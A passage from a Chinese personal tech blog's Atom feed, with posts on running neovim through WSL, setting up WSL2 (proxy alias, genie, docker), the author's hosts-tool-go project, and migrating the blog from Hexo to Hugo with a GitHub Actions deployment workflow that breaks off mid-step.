<p>第三行的 <code>wsl -e nvim $filename.Replace('\','/')</code> 则是真正起作用的代码。<code>$filename.Replace('\','/')</code> 将 <code>\</code> 全部替换为 <code>/</code>，让 wsl 中的 neovim 能够识别我们真正要编辑的文件。<code>wsl -e nvim</code> 则是调用 wsl 中的 neovim 的命令，感兴趣的读者还可阅读 <code>wsl --help</code> 来查看更多用法。</p>
<h2 id="仍存在的问题">仍存在的问题</h2>
<ul>
<li><del>对所要编辑的文件只能使用相对路径，而不能是绝对路径</del>[solved]</li>
</ul>
<p>通过 <code>.Replace('C:','/mnt/c')</code> 将 C 盘的绝对路径转为 wsl 中的相对路径，可实现对绝对路径文件的转译（注：由于本人电脑只有 C 盘，因此并未对其他盘符做兼容处理）</p>
]]></content></entry><entry><title type="html">滚进 wsl2</title><link href="https://blog.batkiz.com/posts/lets-roll-to-wsl2/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/oh-my-powershell/?utm_source=atom_feed" rel="related" type="text/html" title="oh my powershell"/><link href="https://blog.batkiz.com/posts/using-scoop/?utm_source=atom_feed" rel="related" type="text/html" title="初探 Scoop"/><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="related" type="text/html" title="wsl 使用指北"/><link href="https://blog.batkiz.com/posts/solving-cmder-space/?utm_source=atom_feed" rel="related" type="text/html" title="解决 cmder 光标问题"/><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="related" type="text/html" title="如何使用Xbox手柄玩Minecraft"/><id>https://blog.batkiz.com/posts/lets-roll-to-wsl2/</id><published>2019-11-06T23:23:42+08:00</published><updated>2019-11-06T23:23:42+08:00</updated><content type="html"><![CDATA[<p>本文已于 2020/05/26 更新，过时的信息已用删除线标注。</p>
<p><del>我是真没想到这都快过半年了 20H1 还没释出稳定版</del></p>
<p>早在今年上半年的 Build 2019 上，微软<a href="https://devblogs.microsoft.com/commandline/announcing-wsl-2/">宣布了 wsl2</a>，使得 wsl 不再只是 system call 的翻译，而是切切实实跑在一个<strong>真正的</strong> Linux 内核之上。这样一来，wsl 将不再受内核的局限，能够运行 docker 等与 Linux kernel 密切相关的软件。</p>
<p>自宣布以来，wsl2 的开发很快提上日程，并将在 Windows 10 20H1 版本中可用。<del>但想要升级至此版本，目前还需进入预览体验计划，而 Windows 10 目前的 bug 数量使我对 insider fast ring 望而却步。</del> 最近在经过了很长时间的心理斗争之后，我最终还是进入了快速预览版，开始体验 wsl2，下面是途中遇到的一些坑，留存至此，以备后来者避坑。</p>
<p>首先需要说明的是，wsl1 与 wsl2 各有优劣，两者之间并非常规意义上的「升级」，更像是一种并行。如果并非是涉及内核等问题，仅仅是执行一些上层程序，我个人建议继续使用 wsl1，这样更加节省内存等资源。（当然可以 wsl1 与 wsl2 各安装一个/多个，按需启动）</p>
<h2 id="安装">安装</h2>
<p>安装过程参考官方的 <a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-install">WSL 2 的安装说明</a> 即可。</p>
<p>首先滚入 20H1 的预览版，升级系统，而后开启 hyper-v 平台，跑一个命令将原本的 wsl1 转为 wsl2 即可。更改的过程可能要花几分钟时间，等待就好。</p>
<p>之后就能开始使用 wsl2 啦！</p>
<h2 id="各种坑">各种坑</h2>
<p>……当然，路途不总是一帆风顺的，而是伴随着艰难险阻。</p>
<h3 id="虚拟机">虚拟机</h3>
<p><del>由于 VMware 暂未支持嵌套虚拟化，所以开启了 hyper-v 之后，将无法继续使用 VMware 虚拟机。虽然 hyper-v 本身也能装个虚拟机应个急，但体验确实是远远不如 VMware 的。</del></p>
<p>VMware 20H1 技术预览版已支持嵌套虚拟化，可以与 hyper-v 共存，更多信息与下载链接等请 <a href="https://blogs.vmware.com/workstation/2020/01/vmware-workstation-tech-preview-20h1.html">点击此处</a>。</p>
<h3 id="terminal">terminal</h3>
<p><del>另外就是终端问题了。</del></p>
<p><del>我在 wsl1 时期一直使用的终端 wsl-terminal 由于很久没有更新，所以并没有支持 wsl2，但见鬼的是我升级完之后 wsl1 也没办法用了……不过好在还有 windows terminal 这个官方的终端可以使用（虽然现在还不能输入中文有点难受）。</del></p>
<p><del>有一个方法则是可以先启动 powershell，然后通过命令行启动 wsl2。</del></p>
<p><a href="https://github.com/mskyaxl/wsl-terminal">wsl-terminal</a> 与 <a href="https://github.com/mintty/wsltty">wsl-tty</a> 均已支持 wsl2。但由于 windows terminal 的卓越体验（现已支持中文输入），我更为推荐使用 windows terminal 作为 wsl 的终端。感兴趣的可以参考一下 <a href="https://github.com/batkiz/dotfiles/blob/master/wt/settings.json">我的 windows terminal 配置</a>。</p>
<h3 id="代理">代理</h3>
<p>安装了 hyper-v 之后，会将一系列端口划入保留端口之中，其中就包括了某软件的默认端口 1080。解决方法也很简单，换一个高位端口即可。（各种配置里的更改就是一项大工程了）</p>
<p>但真正吊诡则是，在我最初试用 hyper-v 时并未出现这个情况，开始使用 wsl2 后才发生……</p>
<p>此外，wsl2 与 windows 之间存在着网络隔离，虽然 wsl 团队已全力优化但还存在着一些可能会影响体验的问题。如在 windows 中可用 <code>localhost</code> 直接访问 wsl2 的 <code>localhost</code>，但反之则不行。</p>
<p>如果想要在 wsl 中利用 windows 本身的代理，可以在 <code>~/.zshrc</code> 或 <code>~/.bashrc</code> 中写入以下配置（我并不熟悉 fish 所以请 fish 用户自己改改吧）：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># wsl 2 中请启用下面这一行</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># export hostip=$(cat /etc/resolv.conf | grep -oP &#39;(?&lt;=nameserver\ ).*&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># wsl 1 中请启用下面这一行</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># export hostip=&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 请将 1080 换为自己代理软件的端口</span>
</span></span><span style="display:flex;"><span>alias socks<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http_proxy=http://</span><span style="color:#e6db74">${</span>hostip<span style="color:#e6db74">}</span><span style="color:#e6db74">:1080 https_proxy=http://</span><span style="color:#e6db74">${</span>hostip<span style="color:#e6db74">}</span><span style="color:#e6db74">:1080 &#34;</span>
</span></span></code></pre></div><p><code>source ~/.zshrc</code> 之后即可通过 <code>socks command params</code> 来在 shell 中临时使用代理。</p>
<h3 id="systemd">systemd</h3>
<p><strong>警告：作者本人已不在 wsl 2 中使用 docker 与 genie，本部分可能存在不可预知的错误，请审慎阅读。</strong></p>
<p>由于 wsl2 的第一个（<code>PID=1</code>）进程是维持 windows 与 wsl2 通信等所需的 <code>init</code>，因此 systemd 无法以 PID=1 启动，直接无法使用。</p>
<p>但是，人民群众造轮子的热情是不可磨灭的（误），我们可以用 <a href="https://github.com/arkane-systems/genie">genie</a> 来使用 systemd。</p>
<p>genie 的安装过程不再赘述，紧随官方文档或者使用 aur 即可。需要注意的是，genie 需要 dotnet 被引入环境变量，只需在你正使用的 shell 的配置文件（如 zsh 的 <code>~/.zshrc</code> ）中加入 <code>export DOTNET_ROOT=/opt/dotnet</code> 并 <code>source</code> 之以应用即可。</p>
<p>此外，由于其实现原理，最好将宿主机上自定义的 hosts 文件清空，以防出现问题。</p>
<p>安装成功之后，只需执行 <code>genie -s</code> ，systemd 即可正常使用。</p>
<h3 id="docker">docker</h3>
<p>在 systemd 这一问题解决之后，docker 的安装与使用非常简单。</p>
<p><code>yay docker</code> 安装之后，只需通过 <code>systemctl</code> 启用其服务即可，换源等不再赘述。</p>
<h2 id="after">after</h2>
<p>其实在这一套安装下来之后，甚至感觉有点没啥用（？</p>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/><category scheme="https://blog.batkiz.com/tags/wsl" term="wsl" label="wsl"/></entry><entry><title type="html">写在 hosts-tool-go 0.1.0 之际</title><link href="https://blog.batkiz.com/posts/sth-about-hosts-tool-2/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/sth-about-hosts-tool/?utm_source=atom_feed" rel="related" type="text/html" title="关于 hosts-tool 的一些事"/><id>https://blog.batkiz.com/posts/sth-about-hosts-tool-2/</id><published>2019-10-24T23:59:34+08:00</published><updated>2019-10-24T23:59:34+08:00</updated><content type="html"><![CDATA[<p>不知不觉，自 <a href="https://github.com/batkiz/hosts-tool-go/commit/e460d9ce228172e33f8504960a1bb917d5b311a9">第一个 commit</a> 算起，时间已经过去了四个多月。实际的开始开发时间自然要更早一些。host-tool-go 也慢慢变得更加可用，版本号也刷到了 0.1.0。</p>
<p>到现在，在 <a href="https://blog.batkiz.com/2019/06/17/sth-about-hosts-tool/">上一篇文章</a> 中所计划的三个功能也已一一实现：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> local hosts 功能，暂定是搞个 <code>local</code> 文件和 config 文件放一块</li>
<li><input checked="" disabled="" type="checkbox"> home 功能，<code>hosts-tool-go home NAME</code> 来直接浏览器打开这个 hosts 源</li>
<li><input checked="" disabled="" type="checkbox"> 无任何命令行参数附加打开时搞出一个交互式的命令行</li>
</ul>
<h2 id="开发过程">开发过程</h2>
<p>这里记录一些写 go 语言时的小技巧</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// （其实大家都知道 TODO 列表里的事情永远都不会办的对吧
</span></span></span></code></pre></div><p>事实上这个在闲暇之余写的小软件已经完全地满足了我自己的需求，我甚至有点就此封存、甩手不干的冲动。</p>
<p>但说实话，这个小软件还有很多缺点：</p>
<ul>
<li>丑陋的实现</li>
<li>毫无错误处理</li>
<li>没有用上的 API</li>
<li>一团糟的代码管理</li>
<li>词不达意的变量名</li>
<li>etc.</li>
</ul>
<p>所以我还会继续写下去，一步步重构、重写，慢慢完善。</p>
<h2 id="roadmap">ROADMAP</h2>
<p>按照惯例，文章最后我会列出目前所规划的一些东西，具体如下：</p>
<ul>
<li><input disabled="" type="checkbox"> 启动时自动请求 admin/root 权限，省的每次都 <code>sudo</code> 了</li>
<li><input disabled="" type="checkbox"> 使用 goroutine 并行进行各个源的更新</li>
<li><input disabled="" type="checkbox"> 组织代码存放目录与 <code>package</code> 信息</li>
<li><input disabled="" type="checkbox"> 重构代码</li>
<li><input disabled="" type="checkbox"> 添加单元测试</li>
<li><input disabled="" type="checkbox"> 完善错误处理（Go 2 释出之后）</li>
</ul>
<hr>
<p>by <em>batkiz</em> ，2019 年 10 月 24 日夜。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/golang" term="golang" label="golang"/><category scheme="https://blog.batkiz.com/tags/hosts" term="hosts" label="hosts"/></entry><entry><title type="html">博客迁移至 Hugo 并实现自动化</title><link href="https://blog.batkiz.com/posts/migrate-to-hugo-and-automation/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/migrate-to-hugo-and-automation/</id><published>2019-10-20T22:01:44+08:00</published><updated>2019-10-20T22:01:44+08:00</updated><content type="html"><![CDATA[<p>好久不见！</p>
<p>自 6 月以来，本人虽然没什么产出，但怎奈没动力写博客，至今只写了两篇不疼不痒的综述文章。但今天（2019/10/20）偶然在 v2ex 上看到了 <a href="https://www.v2ex.com/t/611063">hexo 释出 4.0 版本</a> 的消息，而后想到自己曾数次想要脱离贵前端生态圈，摆脱令人脑壳痛的依赖问题，实现博客自动化等等等等事情。</p>
<p>于是，我趁着今天是闲暇的周日，把一切事情办好了。</p>
<p>下面是过程复现与总结。</p>
<h2 id="hugo">Hugo</h2>
<p>其实最早我并不是太想换到 Hugo 的，但奈何自己想要写一个静态博客生成器的计划一直提不上日程…… 便选择了这个解决方案。</p>
<p>之后是主题的选择。由于 Hugo 的主题生态圈较之 Hexo 仍较为匮乏，因此选择并不多。经过我在各种网站上的搜罗与比较，下面列出我较为偏向的选择：</p>
<ul>
<li>Maupassant，这个是我在 Hexo 上一直使用的主题，但 Hugo 上的移植版我不太满意，pass。</li>
<li><a href="https://linw1995.com/">https://linw1995.com/</a>，这个主题我十分喜欢，但由于没有提供主题的 repo，只能作罢。</li>
<li><a href="https://github.com/liuzc/LeaveIt">LeaveIt</a>，这个主题看着还行，但太久没维护，都没办法用……</li>
<li><a href="https://github.com/Fastbyte01/KeepIt">KeepIt</a>，这个是上面 LeaveIt 的 fork，也是我最终的选择。</li>
</ul>
<p>但由于 KeepIt 的功能还是不太能满足我的需求，因此我又 fork 了一份，作为自用。地址 <a href="https://github.com/batkiz/left">batkiz/left</a></p>
<h2 id="开始迁移">开始迁移</h2>
<p>整个迁移过程中，我最在意的是该死的 <strong>兼容性</strong> ，即，我新生成的博客要与之前的博客在整体行为上没有太大变化，下面就是在保证兼容性前提下的迁移过程。</p>
<h3 id="链接">链接</h3>
<p>之前的链接不能直接 404，让读者找不到文章（虽然原来就没啥读者），不能造成割裂行为。</p>
<p>Hexo 默认的链接生成方法为 <code>/:year/:month/:day/:filename/</code>，而 Hugo 的则为 <code>/:year/:filename/</code>。</p>
<p>解决很简单，修改为相同的即可。</p>
<h3 id="rss">RSS</h3>
<p>之前在 hexo 之上构建时，我采用的 hexo 插件是生成出 <code>atom.xml</code> 文件的，而在新的主题下生成的则是 <code>index.xml</code>。</p>
<p>解决方法：在 <code>config.toml</code> 中加入下列内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span>[<span style="color:#a6e22e">outputs</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">home</span> = [<span style="color:#e6db74">&#34;Atom&#34;</span>, <span style="color:#e6db74">&#34;HTML&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">outputFormats</span>.<span style="color:#a6e22e">Atom</span>]
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mediatype</span> = <span style="color:#e6db74">&#34;application/rss&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">baseName</span> = <span style="color:#e6db74">&#34;atom&#34;</span>
</span></span></code></pre></div><p>即可生成 <code>atom.xml</code> 文件作为 RSS feed。</p>
<p>在成功解决上述兼容性问题之后，新问题随之而来：<strong>为什么生成的 xml 里 tmd 没有内容？</strong></p>
<p>为解决此问题，我试着看了看源码，但看不懂（</p>
<p>接着我试了试 Google，感谢 <a href="https://github.com/kaushalmodi/hugo-atom-feed">kaushalmodi</a> 的代码，我用它覆盖了 <code>index.atom.xml</code> 之后便成功部署了正确的 RSS，简单修改（将默认的只生成最近 6 条增加到 20）之后便符合了需求。</p>
<h3 id="mathjax">mathjax</h3>
<p>虽然我平时很少输入数学公式，但这个功能也不能少！</p>
<p>首先我尝试了将 mathjax 的支持直接写入 head/footer/js 等几个模板，但，还是没用（即使我已经在源码中看到了 mathjax 的支持代码）。</p>
<p>接下来仍然是 Google。</p>
<p>感谢 <a href="http://weibo.com/u/2837672545">匿蟒</a>，我在 <a href="https://note.qidong.name/2018/03/hugo-mathjax/">在 Hugo 中使用 MathJax</a> 一文中找到了解决方案，即下述方法：</p>
<p>在添加 <a href="https://www.mathjax.org/">MathJax</a> 时，把所有修改写成了一个 <code>layouts/partials/mathjax.html</code> 文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">async</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML&#34;</span>
</span></span><span style="display:flex;"><span>&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Config</span>({
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;HTML-CSS&#34;</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">preferredFont</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;TeX&#34;</span>, <span style="color:#a6e22e">availableFonts</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#34;STIX&#34;</span>, <span style="color:#e6db74">&#34;TeX&#34;</span>], <span style="color:#a6e22e">linebreaks</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">automatic</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }, <span style="color:#a6e22e">EqnChunk</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Browser</span>.<span style="color:#a6e22e">isMobile</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span>) },
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">tex2jax</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">inlineMath</span><span style="color:#f92672">:</span> [[<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;$&#34;</span>], [<span style="color:#e6db74">&#34;\\(&#34;</span>, <span style="color:#e6db74">&#34;\\)&#34;</span>]], <span style="color:#a6e22e">processEscapes</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">ignoreClass</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;tex2jax_ignore|dno&#34;</span>, <span style="color:#a6e22e">skipTags</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;script&#39;</span>, <span style="color:#e6db74">&#39;noscript&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;textarea&#39;</span>, <span style="color:#e6db74">&#39;pre&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span>] },
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">TeX</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">noUndefined</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">mathcolor</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;red&#34;</span>, <span style="color:#a6e22e">mathbackground</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;#FFEEEE&#34;</span>, <span style="color:#a6e22e">mathsize</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;90%&#34;</span>} }, <span style="color:#a6e22e">Macros</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;{}&#34;</span> } },
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">messageStyle</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;none&#34;</span>
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">Queue</span>(<span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">all</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MathJax</span>.<span style="color:#a6e22e">Hub</span>.<span style="color:#a6e22e">getAllJax</span>(), <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">all</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">all</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">SourceElement</span>().<span style="color:#a6e22e">parentNode</span>.<span style="color:#a6e22e">className</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;has-jax&#39;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">code</span>.<span style="color:#a6e22e">has-jax</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">font</span>: <span style="color:#66d9ef">inherit</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">font-size</span>: <span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">background</span>: <span style="color:#66d9ef">inherit</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">border</span>: <span style="color:#66d9ef">inherit</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#515151</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">style</span>&gt;
</span></span></code></pre></div><p>这里，把官网的三处修改合并成一个 partial。 此外，还把 <a href="https://www.mathjax.org/">MathJax</a> 的 CDN 从 <code>cdnjs.cloudflare.com</code> 替换成了 <code>cdn.bootcss.com</code>，更好地支持国内。</p>
<p>把这个 partial 模板添加到 <code>&lt;head&gt;</code> 中，即可正常工作。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>{{partial &#34;mathjax.html&#34; .}}
</span></span></code></pre></div><h3 id="frontmatter">frontmatter</h3>
<p>Hugo 支持 toml, yml 与 json 格式的 frontmatter，但与 Hexo 的 yml frontmatter 又有所不同。</p>
<p>Hugo 中的 tags 的形式应为</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">tags</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">hello</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">world</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">etc</span>
</span></span></code></pre></div><p>即使只有一个 tag ，也要按此格式来写，否则会编译错误。</p>
<p>此外还有 title 的值应被包裹在括号之中等。</p>
<p>另外，hexo 中的 time 项可不用修改，Hugo 似乎已支持了此种格式。</p>
<h2 id="版本控制与自动化">版本控制与自动化</h2>
<p>很久之前也曾想过要实现博客的云同步与自动化部署，但当时没有余力去做，今天趁着迁移博客，顺带利用 GitHub actions 实现自动化。</p>
<h3 id="版本控制">版本控制</h3>
<p>首先是对内容（markdown 文件）的版本控制。</p>
<p>对 <code>hugo new site .</code> 生成出来的文件夹，使用 <code>git init</code> ，并添加以下的 <code>.gitignore</code> 信息：</p>
<pre tabindex="0"><code class="language-gitignore" data-lang="gitignore">/archetypes/
/data/
/layouts/
/public/
/resources/
/static/
/themes/
</code></pre><p>这样的话，只有下面两项被加入了版本控制之中：</p>
<ul>
<li><code>content/</code>，这个是文章所在的文件夹</li>
<li><code>config.toml</code>，这个是 hugo 的配置文件</li>
</ul>
<p>之后可以将此目录推向 GitHub，进行文章的版本控制与部署的自动化。</p>
<h3 id="自动化">自动化</h3>
<p>Hugo 的无依赖特性、配置都写在根目录下的 config.toml 文件中的功能与 GitHub Actions 的出现，使得文章自动部署变得极为简单。毫不夸张的说，在最初的配置之后，我们可以专注于文章的内容，本地甚至不需要有 Hugo 的存在。</p>
<p>下面是 GitHub Actions 的 workflow，详情请看注释。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">name</span>: <span style="color:#ae81ff">blog</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">on</span>: [<span style="color:#ae81ff">push]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Build</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">runs-on</span>: <span style="color:#ae81ff">ubuntu-latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">steps</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 使用预编译的 Hugo 二进制文件</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Setup Hugo</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">peaceiris/actions-hugo@v2.2.2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">hugo-version</span>: <span style="color:#e6db74">&#34;latest&#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e"># 使用 Hugo-extended 版本</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">extended</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 新建站点</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">new site</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          hugo new site $HOME/blog</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取主题</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">get theme</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git clone --depth=1 https://github.com/batkiz/left.git $HOME/blog/themes/left</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取 username.github.io 以保持 commit 记录</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">get username.github.io</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git clone --no-checkout https://github.com/batkiz/batkiz.github.io.git $HOME/blog/public</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取内容文件</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/checkout@v1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">fetch-depth</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 将内容文件复制进入站点内</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">copy in</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          rm -rf $HOME/blog/config.toml $HOME/blog/content/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          /bin/cp -rf config.toml $HOME/blog/config.toml
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          /bin/cp -rf content/ $HOME/blog/content/</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># build</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">build</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          cd $HOME/blog
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          HUGO_ENV=production hugo --gc --minify</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 将生成出的站点推向 username.github.io</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">publish</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">env</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">USER</span>: <span style="color:#ae81ff">batkiz</span>
